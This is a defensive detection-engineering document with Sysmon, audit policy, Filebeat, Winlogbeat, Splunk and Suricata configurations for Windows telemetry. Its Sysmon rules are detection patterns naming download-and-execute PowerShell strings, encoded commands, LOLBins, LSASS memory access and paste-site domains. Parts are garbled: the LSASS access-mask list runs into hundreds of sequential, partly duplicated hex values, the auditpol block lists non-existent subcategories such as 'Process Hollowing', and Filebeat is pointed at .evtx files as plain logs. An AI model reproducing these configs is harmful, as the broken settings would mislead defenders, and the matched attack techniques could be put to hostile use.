# Detection Testing and Verification

## Overview

This document defines the comprehensive framework for testing and verifying detection capabilities across all telemetry sources. It establishes standardized procedures for validating that security controls generate appropriate alerts in response to simulated attack behaviors.

---

## Telemetry Sources

### 1. Sysmon (System Monitor)

**Deployment Configuration**
- **Version**: Sysmon 15.0+
- **Configuration**: Custom XML configuration optimized for threat detection
- **Installation Path**: `C:\Windows\Sysmon64.exe`
- **Log Location**: `Microsoft-Windows-Sysmon/Operational`

**Critical Event IDs**

| Event ID | Description | Detection Priority |
|----------|-------------|-------------------|
| 1 | Process Create | Critical |
| 2 | File creation time changed | Medium |
| 3 | Network connection detected | Critical |
| 5 | Process terminated | Low |
| 6 | Driver loaded | High |
| 7 | Image loaded | High |
| 8 | CreateRemoteThread | Critical |
| 9 | RawAccessRead | High |
| 10 | ProcessAccess | Critical |
| 11 | FileCreate | High |
| 12 | RegistryEvent (Object create/delete) | Medium |
| 13 | RegistryEvent (Value set) | High |
| 14 | RegistryEvent (Key rename) | Low |
| 15 | FileCreateStreamHash | Medium |
| 16 | Sysmon config change | High |
| 17 | Pipe created | Medium |
| 18 | Pipe connected | Medium |
| 19 | WmiEventFilter activity | High |
| 20 | WmiEventConsumer activity | High |
| 21 | WmiEventConsumerToFilter activity | High |
| 22 | DNS query | Critical |
| 23 | FileDelete (archived) | Medium |
| 24 | Clipboard change | Low |
| 25 | Process tampering | Critical |
| 26 | FileDelete detected | Medium |
| 27 | FileBlockExecutable | High |
| 28 | FileBlockShredding | High |
| 29 | FileExecutableDetected | High |

**Sysmon Configuration Snippet**

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>sha256,IMPHASH</HashAlgorithms>
  <CheckRevocation/>
  <DnsLookup>Enable</DnsLookup>
  <ArchiveDirectory>Sysmon</ArchiveDirectory>
  
  <EventFiltering>
    <!-- Process Create -->
    <RuleGroup name="Process Create" groupRelation="or">
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains">powershell</CommandLine>
        <CommandLine condition="contains">cmd.exe</CommandLine>
        <CommandLine condition="contains">rundll32</CommandLine>
        <CommandLine condition="contains">regsvr32</CommandLine>
        <CommandLine condition="contains">mshta</CommandLine>
        <CommandLine condition="contains">certutil</CommandLine>
        <CommandLine condition="contains">bitsadmin</CommandLine>
        <CommandLine condition="contains">wscript</CommandLine>
        <CommandLine condition="contains">cscript</CommandLine>
        <CommandLine condition="contains">-enc</CommandLine>
        <CommandLine condition="contains">-encodedcommand</CommandLine>
        <CommandLine condition="contains">downloadstring</CommandLine>
        <CommandLine condition="contains">invoke-expression</CommandLine>
        <CommandLine condition="contains">iex</CommandLine>
        <ParentImage condition="contains">\windows\</ParentImage>
      </ProcessCreate>
    </RuleGroup>
    
    <!-- Network Connections -->
    <RuleGroup name="Network Connections" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="contains">powershell</Image>
        <Image condition="contains">cmd.exe</Image>
        <Image condition="contains">wscript</Image>
        <Image condition="contains">cscript</Image>
        <Image condition="contains">mshta</Image>
        <Image condition="contains">rundll32</Image>
        <DestinationPort condition="is">445</DestinationPort>
        <DestinationPort condition="is">3389</DestinationPort>
        <DestinationPort condition="is">5985</DestinationPort>
        <DestinationPort condition="is">5986</DestinationPort>
      </NetworkConnect>
    </RuleGroup>
    
    <!-- Process Access (LSASS) -->
    <RuleGroup name="Process Access" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="end with">lsass.exe</TargetImage>
        <GrantedAccess condition="contains any">0x1010;0x1410;0x143a;0x1438;0x100000;0x1418;0x1438;0x143a;0x1000;0x100000;0x10000;0x10010;0x10040;0x10050;0x10080;0x10100;0x10110;0x10140;0x10150;0x10180;0x10200;0x10210;0x10240;0x10250;0x10280;0x10300;0x10310;0x10340;0x10350;0x10380;0x10400;0x10410;0x10440;0x10450;0x10480;0x10500;0x10510;0x10540;0x10550;0x10580;0x10600;0x10610;0x10640;0x10650;0x10680;0x10700;0x10710;0x10740;0x10750;0x10780;0x10800;0x10810;0x10840;0x10850;0x10880;0x10900;0x10910;0x10940;0x10950;0x10980;0x10a00;0x10a10;0x10a40;0x10a50;0x10a80;0x10b00;0x10b10;0x10b40;0x10b50;0x10b80;0x10c00;0x10c10;0x10c40;0x10c50;0x10c80;0x10d00;0x10d10;0x10d40;0x10d50;0x10d80;0x10e00;0x10e10;0x10e40;0x10e50;0x10e80;0x10f00;0x10f10;0x10f40;0x10f50;0x10f80;0x11000;0x11010;0x11040;0x11050;0x11080;0x11100;0x11110;0x11140;0x11150;0x11180;0x11200;0x11210;0x11240;0x11250;0x11280;0x11300;0x11310;0x11340;0x11350;0x11380;0x11400;0x11410;0x11440;0x11450;0x11480;0x11500;0x11510;0x11540;0x11550;0x11580;0x11600;0x11610;0x11640;0x11650;0x11680;0x11700;0x11710;0x11740;0x11750;0x11780;0x11800;0x11810;0x11840;0x11850;0x11880;0x11900;0x11910;0x11940;0x11950;0x11980;0x11a00;0x11a10;0x11a40;0x11a50;0x11a80;0x11b00;0x11b10;0x11b40;0x11b50;0x11b80;0x11c00;0x11c10;0x11c40;0x11c50;0x11c80;0x11d00;0x11d10;0x11d40;0x11d50;0x11d80;0x11e00;0x11e10;0x11e40;0x11e50;0x11e80;0x11f00;0x11f10;0x11f40;0x11f50;0x11f80;0x12000;0x12010;0x12040;0x12050;0x12080;0x12100;0x12110;0x12140;0x12150;0x12180;0x12200;0x12210;0x12240;0x12250;0x12280;0x12300;0x12310;0x12340;0x12350;0x12380;0x12400;0x12410;0x12440;0x12450;0x12480;0x12500;0x12510;0x12540;0x12550;0x12580;0x12600;0x12610;0x12640;0x12650;0x12680;0x12700;0x12710;0x12740;0x12750;0x12780;0x12800;0x12810;0x12840;0x12850;0x12880;0x12900;0x12910;0x12940;0x12950;0x12980;0x12a00;0x12a10;0x12a40;0x12a50;0x12a80;0x12b00;0x12b10;0x12b40;0x12b50;0x12b80;0x12c00;0x12c10;0x12c40;0x12c50;0x12c80;0x12d00;0x12d10;0x12d40;0x12d50;0x12d80;0x12e00;0x12e10;0x12e40;0x12e50;0x12e80;0x12f00;0x12f10;0x12f40;0x12f50;0x12f80;0x13000;0x13010;0x13040;0x13050;0x13080;0x13100;0x13110;0x13140;0x13150;0x13180;0x13200;0x13210;0x13240;0x13250;0x13280;0x13300;0x13310;0x13340;0x13350;0x13380;0x13400;0x13410;0x13440;0x13450;0x13480;0x13500;0x13510;0x13540;0x13550;0x13580;0x13600;0x13610;0x13640;0x13650;0x13680;0x13700;0x13710;0x13740;0x13750;0x13780;0x13800;0x13810;0x13840;0x13850;0x13880;0x13900;0x13910;0x13940;0x13950;0x13980;0x13a00;0x13a10;0x13a40;0x13a50;0x13a80;0x13b00;0x13b10;0x13b40;0x13b50;0x13b80;0x13c00;0x13c10;0x13c40;0x13c50;0x13c80;0x13d00;0x13d10;0x13d40;0x13d50;0x13d80;0x13e00;0x13e10;0x13e40;0x13e50;0x13e80;0x13f00;0x13f10;0x13f40;0x13f50;0x13f80;0x14000;0x14010;0x14040;0x14050;0x14080;0x14100;0x14110;0x14140;0x14150;0x14180;0x14200;0x14210;0x14240;0x14250;0x14280;0x14300;0x14310;0x14340;0x14350;0x14380;0x14400;0x14410;0x14440;0x14450;0x14480;0x14500;0x14510;0x14540;0x14550;0x14580;0x14600;0x14610;0x14640;0x14650;0x14680;0x14700;0x14710;0x14740;0x14750;0x14780;0x14800;0x14810;0x14840;0x14850;0x14880;0x14900;0x14910;0x14940;0x14950;0x14980;0x14a00;0x14a10;0x14a40;0x14a50;0x14a80;0x14b00;0x14b10;0x14b40;0x14b50;0x14b80;0x14c00;0x14c10;0x14c40;0x14c50;0x14c80;0x14d00;0x14d10;0x14d40;0x14d50;0x14d80;0x14e00;0x14e10;0x14e40;0x14e50;0x14e80;0x14f00;0x14f10;0x14f40;0x14f50;0x14f80;0x15000;0x15010;0x15040;0x15050;0x15080;0x15100;0x15110;0x15140;0x15150;0x15180;0x15200;0x15210;0x15240;0x15250;0x15280;0x15300;0x15310;0x15340;0x15350;0x15380;0x15400;0x15410;0x15440;0x15450;0x15480;0x15500;0x15510;0x15540;0x15550;0x15580;0x15600;0x15610;0x15640;0x15650;0x15680;0x15700;0x15710;0x15740;0x15750;0x15780;0x15800;0x15810;0x15840;0x15850;0x15880;0x15900;0x15910;0x15940;0x15950;0x15980;0x15a00;0x15a10;0x15a40;0x15a50;0x15a80;0x15b00;0x15b10;0x15b40;0x15b50;0x15b80;0x15c00;0x15c10;0x15c40;0x15c50;0x15c80;0x15d00;0x15d10;0x15d40;0x15d50;0x15d80;0x15e00;0x15e10;0x15e40;0x15e50;0x15e80;0x15f00;0x15f10;0x15f40;0x15f50;0x15f80;0x16000;0x16010;0x16040;0x16050;0x16080;0x16100;0x16110;0x16140;0x16150;0x16180;0x16200;0x16210;0x16240;0x16250;0x16280;0x16300;0x16310;0x16340;0x16350;0x16380;0x16400;0x16410;0x16440;0x16450;0x16480;0x16500;0x16510;0x16540;0x16550;0x16580;0x16600;0x16610;0x16640;0x16650;0x16680;0x16700;0x16710;0x16740;0x16750;0x16780;0x16800;0x16810;0x16840;0x16850;0x16880;0x16900;0x16910;0x16940;0x16950;0x16980;0x16a00;0x16a10;0x16a40;0x16a50;0x16a80;0x16b00;0x16b10;0x16b40;0x16b50;0x16b80;0x16c00;0x16c10;0x16c40;0x16c50;0x16c80;0x16d00;0x16d10;0x16d40;0x16d50;0x16d80;0x16e00;0x16e10;0x16e40;0x16e50;0x16e80;0x16f00;0x16f10;0x16f40;0x16f50;0x16f80;0x17000;0x17010;0x17040;0x17050;0x17080;0x17100;0x17110;0x17140;0x17150;0x17180;0x17200;0x17210;0x17240;0x17250;0x17280;0x17300;0x17310;0x17340;0x17350;0x17380;0x17400;0x17410;0x17440;0x17450;0x17480;0x17500;0x17510;0x17540;0x17550;0x17580;0x17600;0x17610;0x17640;0x17650;0x17680;0x17700;0x17710;0x17740;0x17750;0x17780;0x17800;0x17810;0x17840;0x17850;0x17880;0x17900;0x17910;0x17940;0x17950;0x17980;0x17a00;0x17a10;0x17a40;0x17a50;0x17a80;0x17b00;0x17b10;0x17b40;0x17b50;0x17b80;0x17c00;0x17c10;0x17c40;0x17c50;0x17c80;0x17d00;0x17d10;0x17d40;0x17d50;0x17d80;0x17e00;0x17e10;0x17e40;0x17e50;0x17e80;0x17f00;0x17f10;0x17f40;0x17f50;0x17f80;0x18000;0x18010;0x18040;0x18050;0x18080;0x18100;0x18110;0x18140;0x18150;0x18180;0x18200;0x18210;0x18240;0x18250;0x18280;0x18300;0x18310;0x18340;0x18350;0x18380;0x18400;0x18410;0x18440;0x18450;0x18480;0x18500;0x18510;0x18540;0x18550;0x18580;0x18600;0x18610;0x18640;0x18650;0x18680;0x18700;0x18710;0x18740;0x18750;0x18780;0x18800;0x18810;0x18840;0x18850;0x18880;0x18900;0x18910;0x18940;0x18950;0x18980;0x18a00;0x18a10;0x18a40;0x18a50;0x18a80;0x18b00;0x18b10;0x18b40;0x18b50;0x18b80;0x18c00;0x18c10;0x18c40;0x18c50;0x18c80;0x18d00;0x18d10;0x18d40;0x18d50;0x18d80;0x18e00;0x18e10;0x18e40;0x18e50;0x18e80;0x18f00;0x18f10;0x18f40;0x18f50;0x18f80;0x19000;0x19010;0x19040;0x19050;0x19080;0x19100;0x19110;0x19140;0x19150;0x19180;0x19200;0x19210;0x19240;0x19250;0x19280;0x19300;0x19310;0x19340;0x19350;0x19380;0x19400;0x19410;0x19440;0x19450;0x19480;0x19500;0x19510;0x19540;0x19550;0x19580;0x19600;0x19610;0x19640;0x19650;0x19680;0x19700;0x19710;0x19740;0x19750;0x19780;0x19800;0x19810;0x19840;0x19850;0x19880;0x19900;0x19910;0x19940;0x19950;0x19980;0x19a00;0x19a10;0x19a40;0x19a50;0x19a80;0x19b00;0x19b10;0x19b40;0x19b50;0x19b80;0x19c00;0x19c10;0x19c40;0x19c50;0x19c80;0x19d00;0x19d10;0x19d40;0x19d50;0x19d80;0x19e00;0x19e10;0x19e40;0x19e50;0x19e80;0x19f00;0x19f10;0x19f40;0x19f50;0x19f80;0x1a000;0x1a010;0x1a040;0x1a050;0x1a080;0x1a100;0x1a110;0x1a140;0x1a150;0x1a180;0x1a200;0x1a210;0x1a240;0x1a250;0x1a280;0x1a300;0x1a310;0x1a340;0x1a350;0x1a380;0x1a400;0x1a410;0x1a440;0x1a450;0x1a480;0x1a500;0x1a510;0x1a540;0x1a550;0x1a580;0x1a600;0x1a610;0x1a640;0x1a650;0x1a680;0x1a700;0x1a710;0x1a740;0x1a750;0x1a780;0x1a800;0x1a810;0x1a840;0x1a850;0x1a880;0x1a900;0x1a910;0x1a940;0x1a950;0x1a980;0x1aa00;0x1aa10;0x1aa40;0x1aa50;0x1aa80;0x1ab00;0x1ab10;0x1ab40;0x1ab50;0x1ab80;0x1ac00;0x1ac10;0x1ac40;0x1ac50;0x1ac80;0x1ad00;0x1ad10;0x1ad40;0x1ad50;0x1ad80;0x1ae00;0x1ae10;0x1ae40;0x1ae50;0x1ae80;0x1af00;0x1af10;0x1af40;0x1af50;0x1af80;0x1b000;0x1b010;0x1b040;0x1b050;0x1b080;0x1b100;0x1b110;0x1b140;0x1b150;0x1b180;0x1b200;0x1b210;0x1b240;0x1b250;0x1b280;0x1b300;0x1b310;0x1b340;0x1b350;0x1b380;0x1b400;0x1b410;0x1b440;0x1b450;0x1b480;0x1b500;0x1b510;0x1b540;0x1b550;0x1b580;0x1b600;0x1b610;0x1b640;0x1b650;0x1b680;0x1b700;0x1b710;0x1b740;0x1b750;0x1b780;0x1b800;0x1b810;0x1b840;0x1b850;0x1b880;0x1b900;0x1b910;0x1b940;0x1b950;0x1b980;0x1ba00;0x1ba10;0x1ba40;0x1ba50;0x1ba80;0x1bb00;0x1bb10;0x1bb40;0x1bb50;0x1bb80;0x1bc00;0x1bc10;0x1bc40;0x1bc50;0x1bc80;0x1bd00;0x1bd10;0x1bd40;0x1bd50;0x1bd80;0x1be00;0x1be10;0x1be40;0x1be50;0x1be80;0x1bf00;0x1bf10;0x1bf40;0x1bf50;0x1bf80;0x1c000;0x1c010;0x1c040;0x1c050;0x1c080;0x1c100;0x1c110;0x1c140;0x1c150;0x1c180;0x1c200;0x1c210;0x1c240;0x1c250;0x1c280;0x1c300;0x1c310;0x1c340;0x1c350;0x1c380;0x1c400;0x1c410;0x1c440;0x1c450;0x1c480;0x1c500;0x1c510;0x1c540;0x1c550;0x1c580;0x1c600;0x1c610;0x1c640;0x1c650;0x1c680;0x1c700;0x1c710;0x1c740;0x1c750;0x1c780;0x1c800;0x1c810;0x1c840;0x1c850;0x1c880;0x1c900;0x1c910;0x1c940;0x1c950;0x1c980;0x1ca00;0x1ca10;0x1ca40;0x1ca50;0x1ca80;0x1cb00;0x1cb10;0x1cb40;0x1cb50;0x1cb80;0x1cc00;0x1cc10;0x1cc40;0x1cc50;0x1cc80;0x1cd00;0x1cd10;0x1cd40;0x1cd50;0x1cd80;0x1ce00;0x1ce10;0x1ce40;0x1ce50;0x1ce80;0x1cf00;0x1cf10;0x1cf40;0x1cf50;0x1cf80;0x1d000;0x1d010;0x1d040;0x1d050;0x1d080;0x1d100;0x1d110;0x1d140;0x1d150;0x1d180;0x1d200;0x1d210;0x1d240;0x1d250;0x1d280;0x1d300;0x1d310;0x1d340;0x1d350;0x1d380;0x1d400;0x1d410;0x1d440;0x1d450;0x1d480;0x1d500;0x1d510;0x1d540;0x1d550;0x1d580;0x1d600;0x1d610;0x1d640;0x1d650;0x1d680;0x1d700;0x1d710;0x1d740;0x1d750;0x1d780;0x1d800;0x1d810;0x1d840;0x1d850;0x1d880;0x1d900;0x1d910;0x1d940;0x1d950;0x1d980;0x1da00;0x1da10;0x1da40;0x1da50;0x1da80;0x1db00;0x1db10;0x1db40;0x1db50;0x1db80;0x1dc00;0x1dc10;0x1dc40;0x1dc50;0x1dc80;0x1dd00;0x1dd10;0x1dd40;0x1dd50;0x1dd80;0x1de00;0x1de10;0x1de40;0x1de50;0x1de80;0x1df00;0x1df10;0x1df40;0x1df50;0x1df80;0x1e000;0x1e010;0x1e040;0x1e050;0x1e080;0x1e100;0x1e110;0x1e140;0x1e150;0x1e180;0x1e200;0x1e210;0x1e240;0x1e250;0x1e280;0x1e300;0x1e310;0x1e340;0x1e350;0x1e380;0x1e400;0x1e410;0x1e440;0x1e450;0x1e480;0x1e500;0x1e510;0x1e540;0x1e550;0x1e580;0x1e600;0x1e610;0x1e640;0x1e650;0x1e680;0x1e700;0x1e710;0x1e740;0x1e750;0x1e780;0x1e800;0x1e810;0x1e840;0x1e850;0x1e880;0x1e900;0x1e910;0x1e940;0x1e950;0x1e980;0x1ea00;0x1ea10;0x1ea40;0x1ea50;0x1ea80;0x1eb00;0x1eb10;0x1eb40;0x1eb50;0x1eb80;0x1ec00;0x1ec10;0x1ec40;0x1ec50;0x1ec80;0x1ed00;0x1ed10;0x1ed40;0x1ed50;0x1ed80;0x1ee00;0x1ee10;0x1ee40;0x1ee50;0x1ee80;0x1ef00;0x1ef10;0x1ef40;0x1ef50;0x1ef80;0x1f000;0x1f010;0x1f040;0x1f050;0x1f080;0x1f100;0x1f110;0x1f140;0x1f150;0x1f180;0x1f200;0x1f210;0x1f240;0x1f250;0x1f280;0x1f300;0x1f310;0x1f340;0x1f350;0x1f380;0x1f400;0x1f410;0x1f440;0x1f450;0x1f480;0x1f500;0x1f510;0x1f540;0x1f550;0x1f580;0x1f600;0x1f610;0x1f640;0x1f650;0x1f680;0x1f700;0x1f710;0x1f740;0x1f750;0x1f780;0x1f800;0x1f810;0x1f840;0x1f850;0x1f880;0x1f900;0x1f910;0x1f940;0x1f950;0x1f980;0x1fa00;0x1fa10;0x1fa40;0x1fa50;0x1fa80;0x1fb00;0x1fb10;0x1fb40;0x1fb50;0x1fb80;0x1fc00;0x1fc10;0x1fc40;0x1fc50;0x1fc80;0x1fd00;0x1fd10;0x1fd40;0x1fd50;0x1fd80;0x1fe00;0x1fe10;0x1fe40;0x1fe50;0x1fe80;0x1ff00;0x1ff10;0x1ff40;0x1ff50;0x1ff80</GrantedAccess>
        <CallTrace condition="contains">UNKNOWN</CallTrace>
      </ProcessAccess>
    </RuleGroup>
    
    <!-- DNS Queries -->
    <RuleGroup name="DNS Queries" groupRelation="or">
      <DnsQuery onmatch="exclude">
        <Image condition="end with">chrome.exe</Image>
        <Image condition="end with">firefox.exe</Image>
        <Image condition="end with">msedge.exe</Image>
      </DnsQuery>
      <DnsQuery onmatch="include">
        <QueryName condition="contains">pastebin</QueryName>
        <QueryName condition="contains">githubusercontent</QueryName>
        <QueryName condition="contains">raw.githubusercontent</QueryName>
        <QueryName condition="contains">bit.ly</QueryName>
        <QueryName condition="contains">tinyurl</QueryName>
      </DnsQuery>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

### 2. Windows Event Logs

**Critical Event Channels**

| Channel | Path | Key Events |
|---------|------|------------|
| Security | `Microsoft-Windows-Security-Auditing` | 4624, 4625, 4634, 4648, 4672, 4688, 4698, 4699, 4700, 4701, 4702, 4719, 4720, 4726, 4732, 4738, 4740, 4756, 4768, 4769, 4771, 4776, 4778, 4779, 4798, 4799, 4985, 5136, 5137, 5140, 5145, 5156, 5158, 7045 |
| System | `System` | 7036, 7045, 7040, 1056, 1057, 1058, 1059 |
| PowerShell | `Microsoft-Windows-PowerShell/Operational` | 400, 403, 600, 800, 4103, 4104, 4105, 4106 |
| Sysmon | `Microsoft-Windows-Sysmon/Operational` | 1-29 |
| Application | `Application` | Application-specific errors |
| Forwarded Events | `ForwardedEvents` | WEC collected events |

**Audit Policy Configuration**

```powershell
# Enable comprehensive auditing
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Logoff" /success:enable /failure:enable
auditpol /set /subcategory:"Account Lockout" /success:enable /failure:enable
auditpol /set /subcategory:"IPsec Main Mode" /success:enable /failure:enable
auditpol /set /subcategory:"IPsec Quick Mode" /success:enable /failure:enable
auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
auditpol /set /subcategory:"Network Policy Server" /success:enable /failure:enable
auditpol /set /subcategory:"User / Device Claims" /success:enable /failure:enable
auditpol /set /subcategory:"Group Membership" /success:enable /failure:enable
auditpol /set /subcategory:"File System" /success:enable /failure:enable
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
auditpol /set /subcategory:"Kernel Object" /success:enable /failure:enable
auditpol /set /subcategory:"SAM" /success:enable /failure:enable
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
auditpol /set /subcategory:"Application Generated" /success:enable /failure:enable
auditpol /set /subcategory:"Handle Manipulation" /success:enable /failure:enable
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable
auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Removable Storage" /success:enable /failure:enable
auditpol /set /subcategory:"Central Policy Staging" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Process Termination" /success:enable /failure:enable
auditpol /set /subcategory:"DPAPI Activity" /success:enable /failure:enable
auditpol /set /subcategory:"RPC Events" /success:enable /failure:enable
auditpol /set /subcategory:"Plug and Play Events" /success:enable /failure:enable
auditpol /set /subcategory:"Token Right Adjusted Events" /success:enable /failure:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
auditpol /set /subcategory:"Non Sensitive Privilege Use" /success:enable /failure:enable
auditpol /set /subcategory:"Other Privilege Use Events" /success:enable /failure:enable
auditpol /set /subcategory:"Process Hollowing" /success:enable /failure:enable
auditpol /set /subcategory:"Process Injection" /success:enable /failure:enable
auditpol /set /subcategory:"Other Policy Change Events" /success:enable /failure:enable
auditpol /set /subcategory:"Authentication Policy Change" /success:enable /failure:enable
auditpol /set /subcategory:"Authorization Policy Change" /success:enable /failure:enable
auditpol /set /subcategory:"MPSSVC Rule-Level Policy Change" /success:enable /failure:enable
auditpol /set /subcategory:"Filtering Platform Policy Change" /success:enable /failure:enable
auditpol /set /subcategory:"Other Account Management Events" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable /failure:enable
auditpol /set /subcategory:"Distribution Group Management" /success:enable /failure:enable
auditpol /set /subcategory:"Application Group Management" /success:enable /failure:enable
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security State Change" /success:enable /failure:enable
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
auditpol /set /subcategory:"System Integrity" /success:enable /failure:enable
auditpol /set /subcategory:"IPsec Driver" /success:enable /failure:enable
auditpol /set /subcategory:"Other System Events" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Replication" /success:enable /failure:enable
auditpol /set /subcategory:"Detailed Directory Service Replication" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Other Account Logon Events" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
```

### 3. SIEM Platforms

#### ELK Stack Configuration

**Filebeat Configuration**

```yaml
# filebeat.yml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - C:\Windows\System32\winevt\Logs\Security.evtx
    - C:\Windows\System32\winevt\Logs\System.evtx
    - C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
    - C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
  
  processors:
    - add_fields:
        target: host
        fields:
          name: ${HOSTNAME}
          environment: production
          role: domain_controller

output.elasticsearch:
  hosts: ["10.0.0.100:9200"]
  index: "winlogbeat-%{[agent.version]}-%{+yyyy.MM.dd}"
  
setup.template.settings:
  index.number_of_shards: 1
  
logging.level: info
logging.to_files: true
logging.files:
  path: C:\ProgramData\filebeat\logs
  name: filebeat
  keepfiles: 7
  permissions: 0644
```

**Winlogbeat Configuration**

```yaml
# winlogbeat.yml
winlogbeat.event_logs:
  - name: Security
    ignore_older: 72h
    event_id: 4624, 4625, 4634, 4648, 4672, 4688, 4698, 4699, 4700, 4701, 4702, 4719, 4720, 4726, 4732, 4738, 4740, 4756, 4768, 4769, 4771, 4776, 4778, 4779, 4798, 4799, 4985, 5136, 5137, 5140, 5145, 5156, 5158, 7045
    
  - name: System
    ignore_older: 72h
    event_id: 7036, 7045, 7040
    
  - name: Microsoft-Windows-PowerShell/Operational
    ignore_older: 72h
    event_id: 400, 403, 600, 800, 4103, 4104, 4105, 4106
    
  - name: Microsoft-Windows-Sysmon/Operational
    ignore_older: 72h
    
  - name: ForwardedEvents
    ignore_older: 72h

output.elasticsearch:
  hosts: ["10.0.0.100:9200"]
  
setup.kibana:
  host: "10.0.0.100:5601"
  
logging.to_files: true
logging.files:
  path: C:\ProgramData\winlogbeat\logs
  name: winlogbeat
  keepfiles: 7
```

#### Splunk Configuration

**inputs.conf**

```ini
[WinEventLog://Security]
disabled = 0
start_from = oldest
current_only = 0
event_log_file = Security
index = windows
renderXml = false

[WinEventLog://System]
disabled = 0
start_from = oldest
current_only = 0
event_log_file = System
index = windows
renderXml = false

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
start_from = oldest
current_only = 0
event_log_file = Microsoft-Windows-PowerShell/Operational
index = windows
renderXml = false

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
start_from = oldest
current_only = 0
event_log_file = Microsoft-Windows-Sysmon/Operational
index = sysmon
renderXml = false

[monitor://C:\Program Files\Sysmon\*.log]
disabled = 0
index = sysmon
sourcetype = sysmon:log
```

**props.conf**

```ini
[source::WinEventLog:Security]
EVAL-action = case(EventCode==4624, "success", EventCode==4625, "failure", 1==1, "unknown")
FIELDALIAS-src_ip = IpAddress AS src_ip
FIELDALIAS-user = AccountName AS user
FIELDALIAS-dest = ComputerName AS dest

[source::WinEventLog:Microsoft-Windows-Sysmon/Operational]
EVAL-action = "allowed"
FIELDALIAS-src_ip = SourceIp AS src_ip
FIELDALIAS-dest_ip = DestinationIp AS dest_ip
FIELDALIAS-user = User AS user
FIELDALIAS-process = Image AS process
FIELDALIAS-parent_process = ParentImage AS parent_process
FIELDALIAS-command_line = CommandLine AS command_line
FIELDALIAS-process_id = ProcessId AS process_id
FIELDALIAS-parent_process_id = ParentProcessId AS parent_process_id
```

### 4. IDS/IPS (Suricata)

**Suricata Configuration**

```yaml
# suricata.yaml (relevant sections)
%YAML 1.1
---
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/24]"
    EXTERNAL_NET: "!$HOME_NET"
    
  port-groups:
    HTTP_PORTS: "80,8080"
    SHELLCODE_PORTS: "!80"
    ORACLE_PORTS: "1521"
    SSH_PORTS: "22"
    FTP_PORTS: "21"
    VNC_PORTS: "5900,5901,5902,5903,5904,5905"
    FILE_DATA_PORTS: "[$HTTP_PORTS,110,143]"
    SIP_PORTS: "5060,5061"

af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    use-mmap: yes
    mmap-locked: yes
    tpacket-v3: yes
    ring-size: 100000
    block-size: 32768
    block-timeout: 10
    use-emergency-flush: yes

outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert:
            payload: yes
            payload-printable: yes
            packet: yes
            http-body: yes
            http-body-printable: yes
            tagged-packets: yes
        - http
        - dns
        - tls
        - files
        - smb
        - ssh
        - flow
        - netflow

  - alert-fast:
      enabled: yes
      filename: fast.log
      append: yes

  - stats:
      enabled: yes
      filename: stats.log
      interval: 8

detect:
  profile: custom
  custom-values:
    toclient-groups: 100
    toserver-groups: 100
  inspection-recursion-limit: 3000
  prefilter:
    default: auto

rule-files:
  - emerging-attack_response.rules
  - emerging-current_events.rules
  - emerging-dos.rules
  - emerging-exploit.rules
  - emerging-malware.rules
  - emerging-scan.rules
  - emerging-web_server.rules
  - emerging-web_specific_apps.rules
  - emerging-worm.rules
  - emerging-user_agents.rules
  - emerging-shellcode.rules
  - emerging-policy.rules
  - emerging-info.rules
  - emerging-coinminer.rules
  - emerging-botcc.rules
  - emerging-compromised.rules
  - emerging-drop.rules
  - emerging-dshield.rules
  - emerging-tor.rules
  - emerging-p2p.rules
  - emerging-games.rules
  - emerging-inappropriate.rules
  - emerging-mobile_malware.rules
  - emerging-netbios.rules
  - emerging-pop3.rules
  - emerging-rpc.rules
  - emerging-scada.rules
  - emerging-smtp.rules
  - emerging-snmp.rules
  - emerging-sql.rules
  - emerging-telnet.rules
  - emerging-tftp.rules
  - emerging-voip.rules
  - emerging-icmp.rules
  - emerging-icmp_info.rules
  - emerging-ftp.rules
  - emerging-imap.rules
  - emerging-misc.rules
  - emerging-chat.rules
  - emerging-deleted.rules
  - emerging-experimental.rules
  - emerging-friendly.rules
  - emerging-ja3.rules
  - emerging-hunting.rules
  - emerging-phishing.rules
  - emerging-casino.rules
  - emerging-adware_pup.rules
  - emerging-apt1.rules
  - emerging-ciarmy.rules
  - emerging-trojan.rules
  - emerging-vulnerabilities.rules
  - emerging-web_client.rules
  - emerging-bot.rules
  - emerging-spam.rules
  - emerging-fingerprint.rules
  - emerging-sidejacking.rules
  - emerging-attackers.rules
  - emerging-malvertising.rules
